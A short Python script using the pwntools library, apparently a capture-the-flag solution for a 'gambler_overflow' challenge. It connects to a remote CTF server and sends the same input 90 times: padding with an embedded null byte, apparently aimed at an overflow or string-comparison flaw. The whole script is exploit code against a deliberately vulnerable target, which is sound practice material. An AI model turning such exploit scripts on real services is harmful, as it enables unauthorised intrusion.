from pwn import *
context(arch = "amd64", os = "linux", log_level = "Debug")
io = process("./gambler_overflow")
io = remote("ctf.b01lers.com", 9203)

for i in range(90):
    io.sendlineafter("lowercase letters:", "AAAA" + "\0" + "AAAAAAA")
io.recvall()
